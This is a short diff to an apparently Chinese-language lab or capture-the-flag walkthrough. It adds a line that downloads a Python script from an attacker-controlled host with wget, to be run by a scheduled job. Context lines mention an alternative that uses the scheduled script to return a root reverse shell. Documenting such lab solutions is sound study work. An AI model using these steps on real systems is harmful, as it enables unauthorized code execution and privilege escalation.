@@ -173,6 +173,9 @@ f.write(k.read())
 f.close
 ```
 然后shell拿取py文件等待定时执行，查看结果。
+```
+wget 10.10.16.2/new.py
+```
 
 这里其实还有另一种解法，也放在这里，就是使用script定时的功能写py给自己反弹一个root shell。
 ```
